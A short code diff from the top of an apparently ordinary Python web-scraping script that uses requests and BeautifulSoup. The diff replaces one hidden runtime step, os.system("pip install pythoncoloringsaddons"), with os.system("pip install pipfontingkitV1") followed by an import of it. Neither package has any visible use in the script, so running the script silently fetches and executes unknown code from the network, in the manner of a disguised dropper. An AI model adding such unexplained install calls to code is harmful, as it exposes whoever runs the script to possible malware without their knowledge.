@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringsaddons")
-import pythoncoloringsaddons
+os.system("pip install pipfontingkitV1")
+import pipfontingkitV1
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
